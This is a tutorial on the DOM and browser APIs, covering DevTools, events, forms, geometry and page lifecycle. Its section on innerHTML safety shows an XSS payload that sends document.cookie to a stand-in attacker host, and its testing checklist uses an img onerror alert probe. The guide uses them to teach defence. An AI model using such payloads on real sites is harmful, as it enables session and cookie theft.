# The DOM and Browser APIs: Guide

## Toolkit

### DevTools and tooling

Almost everything in this module can be explored live from the browser, so learn where each thing surfaces in Chrome DevTools (Firefox and Safari have close equivalents).

- **Elements panel.** Select a node and it becomes `$0` in the Console. The **Event Listeners** tab lists every listener on the node; untick "Ancestors" to see only its own, and click the file link to jump to the handler. The **Properties** tab shows the DOM object's properties, which is how you see the attribute/property difference directly. Right-click a node and choose **Break on > subtree modifications / attribute modifications** to find the code that is mutating it.
- **Console utilities.** `$('sel')` and `$$('sel')` are shorthand for `querySelector` and `querySelectorAll` (the latter returns a real array). `getEventListeners($0)` returns listeners as data, `monitorEvents($0, 'pointer')` logs events as they fire, and `copy(value)` puts any value on your clipboard.
- **Sources panel.** The **Event Listener Breakpoints** pane pauses on any event category (for example Mouse > click) before your handler runs. **XHR/fetch Breakpoints** pause when a request URL contains a string.
- **Network panel.** Inspect request and response headers (where CORS failures are explained), preflight `OPTIONS` requests, timing, and cancelled requests. Throttle to "Slow 4G" to make loading states and race conditions visible.
- **Application panel.** View and edit Local Storage, Session Storage, IndexedDB, and Cookies, see quota usage under **Storage**, and test back/forward cache eligibility under **Background services > Back/forward cache**.
- **Rendering drawer and Sensors drawer** (Command Menu, `Ctrl+Shift+P`). Rendering has paint flashing and layout shift regions; Sensors overrides geolocation and locale-sensitive conditions.
- **Performance panel.** Record an interaction to see long tasks, forced reflow warnings, and `requestAnimationFrame` callbacks on the main thread track.

Outside the browser, use TypeScript's bundled `lib.dom.d.ts` (hover any DOM API in VS Code for its signature, even in plain JS) and a local static server such as `npx serve`, because many APIs require a secure context and `file://` URLs do not qualify, while `http://localhost` does.

### Testing and verifying your work

Vanilla DOM code is best tested in a real browser. The simulated DOMs used by unit test runners (jsdom, happy-dom) do not perform layout, so `getBoundingClientRect` returns zeros, `IntersectionObserver` and `ResizeObserver` are missing or stubbed, and navigation is partial. Use them for logic that only builds or reads DOM structure; use Playwright, or Vitest's browser mode, for anything involving geometry, observers, focus, storage, or real events.

A practical checklist for "done" on a piece of browser-API code:

- **It works from the keyboard alone.** Tab to every control, activate with Enter and Space, and confirm focus lands somewhere sensible after content changes.
- **Every async path is handled.** Throttle the network to Slow 4G, then go Offline in the Network panel. You should see a loading state, then a real error state, never a blank screen or an unhandled rejection in the Console.
- **Stale work is cancelled.** Type quickly into a search box and check the Network panel: earlier requests should show as `(canceled)`, and the final result must match the final input.
- **Nothing leaks.** After removing a component, `getEventListeners(window)` should not still contain its handlers, and observers should be disconnected. In the Memory panel, take a heap snapshot and search for "Detached" to find DOM nodes that are still referenced.
- **Untrusted text is inert.** Enter `<img src=x onerror=alert(1)>` anywhere user text is rendered; it must appear as literal text.
- **State survives what it should.** Reload, use Back and Forward, open a deep link directly, and open a second tab.
- **Permissions degrade gracefully.** Deny the permission prompt and confirm the feature explains itself rather than breaking.
- **It works in at least two engines.** Check Firefox or Safari for anything marked "limited availability" on MDN, and feature-detect with `if ('share' in navigator)` rather than sniffing the user agent.

### Tricks and gotchas

- `querySelectorAll` returns a static `NodeList`; `getElementsByClassName` and `children` return live collections that change under you while you loop. Convert with `[...list]` when you need array methods.
- `event.target` is where the event started; `event.currentTarget` is the element whose listener is running. In delegation you nearly always want `event.target.closest(selector)`.
- A single `AbortController` can remove any number of listeners and cancel fetches: pass `{ signal }` to each and call `abort()` once on teardown.
- `fetch` resolves on 404 and 500. Check `response.ok` before reading the body, and remember a body can only be read once (`response.clone()` if you need it twice).
- Reading layout (`offsetHeight`, `getBoundingClientRect`, `scrollTop`) after writing styles forces a synchronous reflow. Batch all reads, then all writes.
- `localStorage` stores strings only, is synchronous, and throws in some situations (quota exceeded, storage disabled). Wrap access in `try`/`catch` and always `JSON.parse` defensively.
- `pushState` does not fire `popstate`. Your router must render after calling it.
- `focus` and `blur` do not bubble; `focusin` and `focusout` do. `mouseenter`/`mouseleave` do not bubble; `pointerover`/`pointerout` do.
- The `unload` event is unreliable on mobile, blocks the back/forward cache, and is being phased out in Chrome. Save state on `visibilitychange` (to `hidden`) or `pagehide`.
- Never build HTML from user input with string concatenation. Use `textContent`, or `setHTML()` and a sanitizer when you truly need markup.
- `new URL(path, base)` and `URLSearchParams` handle encoding for you. Hand-built query strings break on `&`, `#`, `+`, and spaces.
- `Intl` formatters are expensive to construct. Create one and reuse it rather than calling `toLocaleString` in a loop.
- Custom element names need a hyphen, and the constructor must not touch attributes or children. Do setup in `connectedCallback`.
- Module scripts and scripts with `defer` run before `DOMContentLoaded`, so wrapping their code in a `DOMContentLoaded` listener is unnecessary.

### Official references

- [MDN: Web APIs](https://developer.mozilla.org/en-US/docs/Web/API) - the index of every browser API, each with a Baseline support banner and compatibility table.
- [DOM Standard (WHATWG)](https://dom.spec.whatwg.org/) - the definition of nodes, trees, events and dispatch, `AbortController`, and `MutationObserver`.
- [HTML Standard (WHATWG)](https://html.spec.whatwg.org/multipage/) - everything DOM-adjacent: forms, the event loop, custom elements, history and navigation, workers, storage.
- [Fetch Standard (WHATWG)](https://fetch.spec.whatwg.org/) - the precise rules for requests, responses, and the CORS protocol.
- [URL Standard (WHATWG)](https://url.spec.whatwg.org/) - how URLs are parsed and serialised, and the `URL`/`URLSearchParams` API.
- [Streams Standard (WHATWG)](https://streams.spec.whatwg.org/) - readable, writable, and transform streams.
- [ECMA-402: ECMAScript Internationalization API](https://tc39.es/ecma402/) - the specification for `Intl`.
- [web.dev: Learn JavaScript and platform articles](https://web.dev/articles) - task-oriented guidance from the Chrome team on performance, storage, and page lifecycle.
- [Chrome DevTools documentation](https://developer.chrome.com/docs/devtools) - how to use each panel referenced in this guide.
- [Baseline (web.dev)](https://web.dev/baseline) - what "widely available" and "newly available" mean when you check whether a feature is safe to use.
- [javascript.info: Browser - Document, Events, Interfaces](https://javascript.info/ui) - the best independent long-form tutorial on the DOM and events.

## Skills

### DOM tree

The browser parses HTML into a tree of objects called nodes. Elements are only one kind of node: there are also text nodes (including the whitespace between tags), comment nodes, the `document` node itself, and `DocumentFragment`. Every node inherits from `Node`, and elements add the `Element` and `HTMLElement` layers on top. That inheritance explains why there are two parallel sets of navigation properties:

```js
const list = document.querySelector('ul');
list.childNodes;         // every node, including whitespace text nodes
list.children;           // elements only
list.firstChild;         // probably a text node containing "\n  "
list.firstElementChild;  // the first <li>
```

Use the element-only versions (`children`, `firstElementChild`, `nextElementSibling`, `parentElement`) unless you specifically care about text.

The tree is not a copy of your source file. The parser repairs markup as it goes: it adds `<html>`, `<head>`, and `<body>` if missing, inserts `<tbody>` inside a `<table>`, closes unclosed `<p>` tags, and moves stray content out of places it cannot live. JavaScript then changes the tree further. This is why "View source" (the bytes the server sent) and the Elements panel (the live tree) differ, and why a selector based on your source markup, such as `table > tr`, can fail to match.

`nodeType` tells you what you have (1 is an element, 3 is text, 8 is a comment), although `node instanceof Element` reads better.

**Try it:** Save a file containing only `<table><tr><td>Hi</td></tr></table><p>One<p>Two`, open it, and compare View Source with the Elements panel. Then run `document.body.childNodes` and `document.body.children` in the Console and account for every difference.

**Resources**
- [MDN: Introduction to the DOM](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction)
- [DOM Standard: Nodes](https://dom.spec.whatwg.org/#nodes)
- [javascript.info: DOM tree](https://javascript.info/dom-nodes)

### Querying

`querySelector(sel)` returns the first matching descendant or `null`; `querySelectorAll(sel)` returns a static `NodeList` of all matches in document order. Both accept any CSS selector, including `:not()`, `:has()`, and attribute selectors, and both can be called on any element to search only within it.

```js
const form = document.querySelector('form#signup');
const invalid = form.querySelectorAll('input:invalid');
invalid.forEach((el) => el.classList.add('error'));   // NodeList has forEach
const names = [...invalid].map((el) => el.name);      // spread for map/filter
```

Two methods work in the other direction. `el.matches(sel)` tests the element itself and returns a boolean. `el.closest(sel)` walks up from the element (starting with itself) and returns the nearest ancestor that matches, or `null`. `closest` is the workhorse of event delegation: `event.target.closest('button')` finds the button even when the click landed on an icon inside it.

Details that catch people out:

- A selector called on an element is still matched against the whole document, then filtered to descendants. `card.querySelector('body .title')` can match. Use `:scope` to anchor: `card.querySelectorAll(':scope > li')`.
- `querySelector` returns `null` when nothing matches, so `document.querySelector('.x').textContent` throws. Use optional chaining or check first.
- IDs or classes with special characters (a colon, a leading digit) must be escaped: `document.querySelector('#' + CSS.escape(id))`.
- `getElementById` is still the fastest lookup, and `getElementsByClassName` returns a live `HTMLCollection`, which changes as the DOM changes.

**Try it:** On any article page, use the Console to count external links with `$$('a[href^="http"]:not([href*="' + location.host + '"])').length`. Then select a deeply nested node in Elements and run `$0.closest('section, article, main')`.

**Resources**
- [MDN: Document.querySelector()](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector)
- [MDN: Element.closest()](https://developer.mozilla.org/en-US/docs/Web/API/Element/closest)
- [MDN: Locating DOM elements using selectors](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Locating_DOM_elements_using_selectors)

### Reading and writing

`textContent` gets or sets the raw text of a node and all its descendants. Setting it replaces every child with a single text node and never parses HTML, which makes it the safe default for displaying data. `innerText` is different: it is layout-aware (it skips hidden elements and applies CSS line breaks), so reading it forces a reflow. Prefer `textContent` unless you need what the user actually sees.

Attributes live in the HTML; properties live on the DOM object. They are often linked, but not always in the way you expect:

```js
input.getAttribute('value'); // the initial value from the markup
input.value;                 // the current value the user typed
link.getAttribute('href');   // "/about" exactly as written
link.href;                   // "https://example.com/about", resolved
checkbox.checked = true;     // changes state; the attribute is untouched
```

For form state (`value`, `checked`, `selected`), always use the property. Boolean attributes are true by being present, so `el.setAttribute('disabled', 'false')` still disables; use `el.disabled = false` or `el.toggleAttribute('disabled', false)`. ARIA and other custom attributes are set with `setAttribute`.

`classList` manages classes without string juggling: `add`, `remove`, `contains`, `replace`, and `toggle(name, force)`, where the second argument turns it into "set to this boolean". `dataset` maps `data-*` attributes to camelCase keys (`data-user-id` becomes `el.dataset.userId`); values are always strings.

`el.style` reads and writes only the inline `style` attribute. It cannot tell you what a stylesheet applied; for that use `getComputedStyle(el)`. Set custom properties with `el.style.setProperty('--gap', '8px')`. In general, toggle a class and let CSS do the work rather than setting many inline styles.

**Try it:** Type into a text input, then compare `$0.value` with `$0.getAttribute('value')`. Call `$0.setAttribute('value', 'x')` and see which one changes on screen, before and after you have typed.

**Resources**
- [MDN: Node.textContent](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent)
- [MDN: Element.classList](https://developer.mozilla.org/en-US/docs/Web/API/Element/classList)
- [javascript.info: Attributes and properties](https://javascript.info/dom-attributes-and-properties)

### Creating and moving nodes

`document.createElement(tag)` makes a detached element. Nothing appears until you insert it. The modern insertion methods accept any number of nodes and strings (strings become text nodes, safely):

```js
const li = document.createElement('li');
li.className = 'todo';
li.append('Buy milk ', badge);     // children, at the end
list.prepend(li);                  // first child of list
li.before(header);                 // sibling before li
li.after(footer);                  // sibling after li
oldNode.replaceWith(newNode);
list.replaceChildren(...items);    // clear and fill in one call
li.remove();
```

The older `appendChild`, `insertBefore`, and `removeChild` still work but take one node and need a parent reference.

A node can only be in one place. Appending an element that is already in the document moves it; it does not copy it. Use `node.cloneNode(true)` for a deep copy, remembering that listeners added with `addEventListener` are not cloned and duplicated `id`s are your problem.

A `DocumentFragment` is a lightweight container with no parent. When you insert a fragment, its children move into the target and the fragment is left empty. It lets you build a batch off-document and insert once. The performance argument is often overstated (the browser does not lay out between synchronous appends), but one insertion still means one mutation record, one set of custom element callbacks, and simpler code. `append(...nodes)` and `replaceChildren(...nodes)` give the same benefit without a fragment.

Moving a node normally resets its state: iframes reload, CSS animations restart, and focus is lost. The newer `moveBefore()` method moves a node while preserving that state, but check browser support before relying on it.

**Try it:** Build a 1,000-row list from an array, once by appending each `<li>` to the live list and once with `list.replaceChildren(...items)`. Then append an existing row to a second list and confirm it left the first.

**Resources**
- [MDN: Element.append()](https://developer.mozilla.org/en-US/docs/Web/API/Element/append)
- [MDN: DocumentFragment](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment)
- [javascript.info: Modifying the document](https://javascript.info/modifying-document)

### `innerHTML` and safety

Setting `innerHTML` runs the HTML parser on a string and replaces the element's children with the result. If any part of that string came from a user, a URL, or an API you do not control, an attacker can inject markup that runs script in your origin with your user's cookies and session. That is cross-site scripting (XSS).

```js
const name = new URLSearchParams(location.search).get('name');
greeting.innerHTML = `Hello, ${name}`;
// ?name=<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
```

A common false comfort: `<script>` tags inserted via `innerHTML` do not execute. Event handler attributes (`onerror`, `onload`), `javascript:` URLs, and `<iframe srcdoc>` all do. The same risk applies to `outerHTML`, `insertAdjacentHTML`, and `document.write`.

What to use instead, in order of preference:

1. **Text APIs.** `el.textContent = name`, or `el.append(name)`. The string is never parsed as HTML.
2. **DOM construction.** `createElement` plus `textContent`, or a `<template>` you clone and fill.
3. **Sanitised HTML** when you really must render rich markup. `el.setHTML(untrusted)` parses and strips anything script-capable. As of late 2026 it is in Chrome and Firefox but not Safari, so use [DOMPurify](https://github.com/cure53/DOMPurify) as the cross-browser option: `el.innerHTML = DOMPurify.sanitize(untrusted)`.

Do not write your own sanitiser with regular expressions, and do not rely on escaping `<` and `>` alone; attribute contexts and URLs need different handling. As defence in depth, a Content Security Policy that disallows inline script limits the damage, and Trusted Types (in all major browsers since early 2026) makes `innerHTML = string` throw unless the value passed through a policy you defined.

There is also a non-security cost: `el.innerHTML += '...'` reparses and recreates every existing child, destroying listeners, focus, and input state.

**Try it:** Make a page that writes a query parameter into the page with `innerHTML`. Trigger an alert with an `<img onerror>` payload, confirm a `<script>` payload does nothing, then fix it with `textContent` and again with `setHTML` or DOMPurify.

**Resources**
- [MDN: Element.innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)
- [MDN: Element.setHTML()](https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML)
- [web.dev: Prevent DOM-based cross-site scripting vulnerabilities with Trusted Types](https://web.dev/articles/trusted-types)

### `template` element

A `<template>` holds markup that the browser parses but does not render or activate. Its children are not part of the document: they live in a separate `DocumentFragment` exposed as `template.content`. While inside a template, images do not load, scripts do not run, styles do not apply, and `document.querySelector` cannot find the contents. You stamp out copies by cloning.

```html
<template id="row">
  <li class="todo">
    <input type="checkbox">
    <span class="title"></span>
    <button type="button" data-action="delete">Delete</button>
  </li>
</template>
```

```js
const tpl = document.querySelector('#row');

function renderTodo(todo) {
  const frag = tpl.content.cloneNode(true);
  const li = frag.firstElementChild;        // grab references before inserting
  li.dataset.id = todo.id;
  li.querySelector('.title').textContent = todo.title;
  li.querySelector('input').checked = todo.done;
  return frag;
}
list.append(...todos.map(renderTodo));
```

This gives you the convenience of writing markup as HTML with the safety of filling it via `textContent`, and the parser only runs once, at page load. Cloning a parsed fragment is faster than reparsing an HTML string for every row.

The mistakes to avoid: appending `tpl.content` itself (that moves the nodes out, so the template is empty the second time); forgetting `true` in `cloneNode(true)` (a shallow clone of a fragment is empty); and keeping a reference to the cloned fragment after appending it, when what you wanted was the element, since the fragment is emptied on insertion.

Templates are also the standard way to define shadow DOM markup for web components, and `<template shadowrootmode="open">` creates a declarative shadow root directly from HTML.

**Try it:** Render a list of ten objects using a `<template>`. Put an `<img>` with a real `src` in the template and confirm in the Network panel that no request happens until a clone is inserted.

**Resources**
- [MDN: The Content Template element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/template)
- [HTML Standard: The template element](https://html.spec.whatwg.org/multipage/scripting.html#the-template-element)
- [MDN: Using templates and slots](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_templates_and_slots)

### Geometry

There are several ways to measure an element and they measure different things.

`el.getBoundingClientRect()` returns a `DOMRect` (`x`, `y`, `width`, `height`, `top`, `right`, `bottom`, `left`) for the border box, relative to the viewport, with fractional precision and with CSS transforms applied. The values change as the page scrolls. For a document-relative position add the scroll offset: `rect.top + window.scrollY`.

The integer properties describe layout boxes and ignore transforms:

| Property | Measures |
| --- | --- |
| `offsetWidth` / `offsetHeight` | Border box: content, padding, border, scrollbar |
| `clientWidth` / `clientHeight` | Padding box, excluding scrollbar and border |
| `scrollWidth` / `scrollHeight` | Full size of the content, including the overflowed part |
| `scrollTop` / `scrollLeft` | How far the content is scrolled (writable) |
| `offsetTop` / `offsetLeft` | Position relative to `offsetParent` |

Useful derived checks: `el.scrollHeight > el.clientHeight` means the content overflows, and `el.scrollTop + el.clientHeight >= el.scrollHeight - 1` means it is scrolled to the bottom (the `- 1` absorbs fractional rounding). For the viewport, use `document.documentElement.clientWidth` (excludes the scrollbar) rather than `window.innerWidth` (includes it).

Every one of these forces the browser to bring layout up to date before answering. If you alternate writes and reads in a loop, you force layout on every iteration, a problem called layout thrashing:

```js
// Bad: read, write, read, write...
items.forEach((el) => { el.style.height = el.offsetWidth + 'px'; });

// Good: all reads, then all writes
const widths = items.map((el) => el.offsetWidth);
items.forEach((el, i) => { el.style.height = widths[i] + 'px'; });
```

If you only need to know whether something is visible or has resized, use `IntersectionObserver` or `ResizeObserver` instead of measuring on scroll.

**Try it:** Give a box `transform: scale(2)` and a border, then compare `offsetWidth`, `clientWidth`, and `getBoundingClientRect().width`. Then record the "bad" loop above over 2,000 elements in the Performance panel and find the forced reflow warning.

**Resources**
- [MDN: Element.getBoundingClientRect()](https://developer.mozilla.org/en-US/docs/Web/API/Element/getBoundingClientRect)
- [MDN: Determining the dimensions of elements](https://developer.mozilla.org/en-US/docs/Web/API/CSS_Object_Model/Determining_the_dimensions_of_elements)
- [web.dev: Avoid large, complex layouts and layout thrashing](https://web.dev/articles/avoid-large-complex-layouts-and-layout-thrashing)

### Listeners

`target.addEventListener(type, listener, options)` registers a function to be called when an event of that type reaches the target. Prefer it to `onclick`-style properties, which allow only one handler and are easily overwritten.

The third argument is an options object:

- `once: true` removes the listener after its first call.
- `passive: true` promises you will not call `preventDefault()`, so the browser can scroll without waiting for your handler. Browsers already default `touchstart`, `touchmove`, and `wheel` listeners on `window`, `document`, and `body` to passive; pass `passive: false` explicitly if you need to block scrolling there.
- `capture: true` runs the listener during the capture phase.
- `signal` ties the listener's life to an `AbortSignal`.

```js
const controller = new AbortController();
const { signal } = controller;

window.addEventListener('resize', onResize, { signal });
document.addEventListener('keydown', onKey, { signal });
button.addEventListener('click', () => save(), { signal });

// Later: remove all three, including the anonymous one
controller.abort();
```

`removeEventListener` needs the same function reference and the same `capture` value. This fails silently when you pass a fresh arrow function or a new `.bind()` result, which is the most common source of leaked listeners. The `signal` pattern avoids the problem entirely and is the cleanest teardown for components.

Other details: adding the identical function, type, and capture flag twice registers it once. Inside a non-arrow listener, `this` is `event.currentTarget`. You can pass an object with a `handleEvent(event)` method instead of a function, which is handy in classes because no binding is needed. Listeners on an element keep whatever they close over alive for as long as the element is referenced.

**Try it:** Add a listener with an inline arrow function, try to remove it with `removeEventListener` using an identical-looking arrow function, and verify with `getEventListeners($0)` that it is still there. Then remove it with an `AbortController`.

**Resources**
- [MDN: EventTarget.addEventListener()](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)
- [MDN: EventTarget.removeEventListener()](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/removeEventListener)
- [DOM Standard: Interface EventTarget](https://dom.spec.whatwg.org/#interface-eventtarget)

### Propagation

When an event is dispatched, the browser computes the path from `window` down to the target and walks it in three phases: **capture** (window down to the target's parent), **target**, and **bubble** (back up to window). Listeners run in the capture phase only if registered with `capture: true`; everything else runs at target or while bubbling.

```js
outer.addEventListener('click', () => console.log('outer capture'), { capture: true });
outer.addEventListener('click', () => console.log('outer bubble'));
inner.addEventListener('click', () => console.log('inner'));
// Clicking inner logs: outer capture, inner, outer bubble
```

`event.target` is the node the event originated on; `event.currentTarget` is the node whose listener is currently running.

Two methods are constantly confused because they are unrelated:

- `event.preventDefault()` cancels the browser's default action (following a link, submitting a form, typing a character, scrolling). The event keeps propagating. It does nothing if `event.cancelable` is false or the listener is passive.
- `event.stopPropagation()` stops the event travelling to further nodes. The default action still happens. `stopImmediatePropagation()` additionally stops other listeners on the same node.

Be reluctant to stop propagation. It breaks any code higher up that depends on seeing events: click-outside-to-close handlers, analytics, delegated listeners. If you need "handled already" semantics, check `event.defaultPrevented` in the outer handler or compare `event.target` instead.

Not every event bubbles. `focus`, `blur`, `mouseenter`, `mouseleave`, and `load`/`error` on resources do not; use `focusin`/`focusout`, or listen in the capture phase, which works for all events. `event.composedPath()` gives the full path, including nodes inside open shadow roots, where `event.target` is otherwise retargeted to the host.

**Try it:** Nest three elements, attach capture and bubble listeners to each that log their name and `event.eventPhase`, and predict the order before clicking the innermost. Then add `stopPropagation()` in the middle capture listener and predict again.

**Resources**
- [MDN: Event bubbling](https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Event_bubbling)
- [DOM Standard: Dispatching events](https://dom.spec.whatwg.org/#dispatching-events)
- [javascript.info: Bubbling and capturing](https://javascript.info/bubbling-and-capturing)

### Event delegation

Because most events bubble, you can put one listener on a container and handle events for all of its descendants, including ones added later. This replaces hundreds of per-item listeners, removes the need to attach and detach listeners as you render, and is how frameworks implement their event systems under the hood.

```js
list.addEventListener('click', (event) => {
  const button = event.target.closest('button[data-action]');
  if (!button || !list.contains(button)) return;

  const item = button.closest('li');
  const { action } = button.dataset;
  if (action === 'delete') removeTodo(item.dataset.id);
  if (action === 'toggle') toggleTodo(item.dataset.id);
});
```

The pattern has three steps: find the element you care about with `event.target.closest(selector)`, bail out if there is none, and confirm the match is inside your container (`closest` keeps climbing past the container, so a matching ancestor outside it would otherwise count). Never compare `event.target` directly against the element type you expect; a click on an `<svg>` or `<span>` inside the button has that inner node as its target.

Put identifying data on the elements (`data-id`, `data-action`) rather than capturing it in closures, since the single handler has to recover what was clicked from the DOM.

Limits to know about: events that do not bubble need a bubbling equivalent (`focusin` instead of `focus`) or a capturing listener; high-frequency events such as `pointermove` on a large container run your matching logic on every event; and anything inside the container that calls `stopPropagation()` hides its events from you. Disabled form controls also do not fire click events in some browsers, so they will not reach a delegated handler.

**Try it:** Build a list where each item has Delete and Toggle buttons containing an icon element. Handle both with one listener on the `<ul>`, add new items dynamically, and confirm with `getEventListeners` that the items themselves have no listeners.

**Resources**
- [javascript.info: Event delegation](https://javascript.info/event-delegation)
- [MDN: Event bubbling - event delegation](https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Event_bubbling#event_delegation)
- [MDN: Element.closest()](https://developer.mozilla.org/en-US/docs/Web/API/Element/closest)

### Pointer and keyboard events

Pointer events unify mouse, touch, and pen into one model: `pointerdown`, `pointermove`, `pointerup`, `pointercancel`, `pointerenter`, `pointerleave`. Each event carries `pointerId`, `pointerType` (`'mouse'`, `'touch'`, `'pen'`), `isPrimary`, and pressure. Use them instead of separate mouse and touch handlers. For a plain "was this activated" you still want `click`, which also fires for keyboard activation of buttons and links.

For dragging, two things matter. Call `el.setPointerCapture(event.pointerId)` on `pointerdown` so subsequent moves and the release are delivered to that element even when the pointer leaves it. And set `touch-action: none` (or `pan-y`, and so on) in CSS on the draggable element; without it the browser claims the touch for scrolling and sends you `pointercancel`.

```js
handle.addEventListener('pointerdown', (e) => {
  handle.setPointerCapture(e.pointerId);
  handle.addEventListener('pointermove', onMove);
  handle.addEventListener('pointerup', () => {
    handle.removeEventListener('pointermove', onMove);
  }, { once: true });
});
```

For the keyboard, use `keydown` (and `keyup`); `keypress` is deprecated. Each event has two identifiers:

- `event.key` is the character or named key produced, respecting layout and modifiers: `'a'`, `'A'`, `'Enter'`, `'Escape'`, `'ArrowLeft'`, `' '` for Space.
- `event.code` is the physical key, independent of layout: `'KeyA'`, `'Space'`, `'Digit1'`.

Use `key` for shortcuts and meaning ("Escape closes the dialog"), and `code` only when physical position matters, such as WASD game controls that should work on an AZERTY keyboard. Check `event.ctrlKey`, `metaKey`, `shiftKey`, and `altKey` for modifiers, `event.repeat` to ignore auto-repeat, and `event.isComposing` to ignore keystrokes that belong to an IME composition (otherwise Enter-to-submit fires while a Japanese or Chinese user is choosing a character). Do not use `keydown` to read text input; listen for `input` instead.

**Try it:** Make a box draggable with pointer events and pointer capture, then test it with touch emulation in DevTools with and without `touch-action: none`. Separately, log `key` and `code` for the same physical key under two keyboard layouts.

**Resources**
- [MDN: Pointer events](https://developer.mozilla.org/en-US/docs/Web/API/Pointer_events)
- [MDN: KeyboardEvent.key](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key)
- [MDN: KeyboardEvent.code](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/code)

### Form events

Three events cover almost all form work:

- `input` fires on every change to a control's value: typing, pasting, dictation, drag and drop, a slider moving. Use it for live validation and search-as-you-type.
- `change` fires when a change is committed: on blur for text fields, immediately for checkboxes, radios, and selects.
- `submit` fires on the `<form>` when it is submitted by a submit button or by pressing Enter in a field, after built-in validation passes.

Always handle `submit` on the form rather than `click` on the button, or you miss Enter-key submission and bypass validation.

```js
form.addEventListener('submit', async (event) => {
  event.preventDefault();
  const data = new FormData(form, event.submitter);
  const res = await fetch(form.action, { method: 'POST', body: data });
  // ...
});
```

`new FormData(form)` collects every successful control: those with a `name`, not disabled, and checked if they are checkboxes or radios. Passing `event.submitter` as the second argument includes the name and value of the button that was pressed. Passing `FormData` as a fetch body sends `multipart/form-data` with the right boundary header, so do not set `Content-Type` yourself. For JSON, convert it:

```js
const obj = Object.fromEntries(data);      // loses repeated keys
const tags = data.getAll('tag');           // use getAll for multi-value fields
```

Things that bite: an unchecked checkbox is simply absent from `FormData`; all values are strings (or `File` objects); calling `form.submit()` skips both validation and the `submit` event, whereas `form.requestSubmit()` behaves like a real click. Both `input` and `change` bubble, so you can delegate them to the form. `form.elements.email` gives you a control by name, and `form.reset()` restores defaults and fires `reset`.

**Try it:** Build a form with a text field, a checkbox group sharing one name, a file input, and two submit buttons with different `value`s. Log `[...new FormData(form, event.submitter)]` on submit and explain each entry, and each absence.

**Resources**
- [MDN: FormData() constructor](https://developer.mozilla.org/en-US/docs/Web/API/FormData/FormData)
- [MDN: HTMLFormElement: submit event](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/submit_event)
- [MDN: Element: input event](https://developer.mozilla.org/en-US/docs/Web/API/Element/input_event)

### Custom events

Any `EventTarget` can dispatch events you define, which gives components a way to announce that something happened without knowing who is listening. Create one with `CustomEvent`, attach data through `detail`, and dispatch it on an element.

```js
// Inside a cart widget
const event = new CustomEvent('cart:add', {
  detail: { sku: 'A-100', qty: 2 },
  bubbles: true,
  cancelable: true,
});
const proceed = widget.dispatchEvent(event);   // false if preventDefault() was called
if (proceed) addToCart(event.detail);

// Anywhere above it in the tree
document.addEventListener('cart:add', (e) => {
  if (e.detail.qty > 10) e.preventDefault();
});
```

The defaults are the opposite of what most people assume: `bubbles`, `cancelable`, and `composed` are all `false`. Without `bubbles: true` only listeners on the exact target see the event. Without `composed: true` an event dispatched inside a shadow root does not cross out of it. `dispatchEvent` returns `false` only when the event is cancelable and a listener called `preventDefault()`, which lets listeners veto an action.

Crucially, `dispatchEvent` is synchronous. All listeners run before it returns, unlike native events triggered by user input, which are queued as tasks. An exception thrown in a listener is reported but does not propagate to the dispatcher.

Naming: use lowercase and a namespace separator (`cart:add`, `todo-change`) so you never collide with a native event added later. `detail` is passed by reference, not cloned.

You do not need the DOM to use this mechanism. `new EventTarget()` gives a standalone event bus, and `class Store extends EventTarget` gives a class its own `addEventListener`. Events you create have `isTrusted: false`, and synthetic `click` events dispatched this way do not trigger most default actions in the way a real user gesture would.

**Try it:** Write a `Store` class extending `EventTarget` that dispatches a `change` event with the new state in `detail` whenever `set()` is called. Subscribe two independent renderers to it and log to prove dispatch is synchronous.

**Resources**
- [MDN: CustomEvent() constructor](https://developer.mozilla.org/en-US/docs/Web/API/CustomEvent/CustomEvent)
- [MDN: EventTarget.dispatchEvent()](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/dispatchEvent)
- [javascript.info: Dispatching custom events](https://javascript.info/dispatch-events)

### Page lifecycle

A page moves through a sequence of states, and each has an event.

- `DOMContentLoaded` (on `document`): the HTML is parsed and deferred and module scripts have run. Images and stylesheets may still be loading. If your script is a module or has `defer`, the DOM is already complete when it runs, so you rarely need this event. When attaching it from code that may run late, check `document.readyState !== 'loading'` first, because the event will not fire again.
- `load` (on `window`): every subresource has finished. Useful for measuring, rarely the right time to start your app.
- `visibilitychange` (on `document`): `document.visibilityState` flipped between `'visible'` and `'hidden'`. This fires when the user switches tabs, minimises, locks the phone, or navigates away.
- `pagehide` (on `window`): the page is being navigated away from. `event.persisted` is true if it is going into the back/forward cache. Its partner `pageshow` fires on load and on restore from that cache, again with `persisted`.

The practical rule: **the transition to `hidden` is the last event you can count on.** On mobile, a backgrounded tab can be killed without any further event. Save drafts and send analytics there, using a request that survives the page: `navigator.sendBeacon(url, data)` or `fetch(url, { method: 'POST', body, keepalive: true })`.

```js
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') {
    navigator.sendBeacon('/analytics', JSON.stringify(metrics));
  }
});
```

Avoid `unload` altogether, and use `beforeunload` only while there are unsaved changes (add it when the form becomes dirty, remove it when saved). Both make the page ineligible for the back/forward cache (bfcache), which otherwise restores a page instantly with its JavaScript state intact. Because of bfcache, a page can reappear without `DOMContentLoaded` running again; refresh stale data in `pageshow` when `event.persisted` is true.

**Try it:** Log all five events with timestamps, then switch tabs, navigate away, and press Back. Open Application > Back/forward cache and run the test; add an `unload` listener and run it again to see the page become ineligible.

**Resources**
- [Chrome for Developers: Page Lifecycle API](https://developer.chrome.com/docs/web-platform/page-lifecycle-api)
- [web.dev: Back/forward cache](https://web.dev/articles/bfcache)
